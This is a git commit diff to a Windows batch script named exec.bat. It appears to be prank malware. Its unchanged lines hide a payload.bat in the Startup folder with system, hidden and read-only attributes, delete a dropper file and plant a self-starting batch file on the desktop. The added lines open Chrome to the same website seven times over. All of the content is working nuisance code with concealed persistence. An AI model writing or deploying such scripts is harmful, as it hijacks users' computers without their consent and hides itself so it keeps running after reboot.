49b9842876e72c51a192c7fc8c99e9dcccaa1649
timberh789 <53507393+timberh789@users.noreply.github.com>
2022-01-26 11:13:11 +0800

    Update exec.bat

--- exec.bat
+++ exec.bat
@@ -2,3 +2,10 @@
 attrib +s +h +r "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\payload.bat"
 del pls.bat
 echo "start %0"> %USERPROFILE%\Desktop\EXECUTE.bat
+start chrome.exe https://www.yahoo.com.hk
+start chrome.exe https://www.yahoo.com.hk
+start chrome.exe https://www.yahoo.com.hk
+start chrome.exe https://www.yahoo.com.hk
+start chrome.exe https://www.yahoo.com.hk
+start chrome.exe https://www.yahoo.com.hk
+start chrome.exe https://www.yahoo.com.hk
